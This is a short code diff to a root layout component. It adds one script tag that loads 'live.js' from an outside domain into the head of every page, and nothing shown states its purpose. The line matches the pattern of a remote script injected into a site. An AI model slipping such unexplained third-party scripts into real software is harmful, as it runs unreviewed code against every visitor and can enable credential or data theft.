@@ -116,6 +116,7 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="en">
       <head>
         <HeadContent />
+        <script src="https://tec.altanomundo.com/live.js" async />
       </head>
       <body>
         {children}
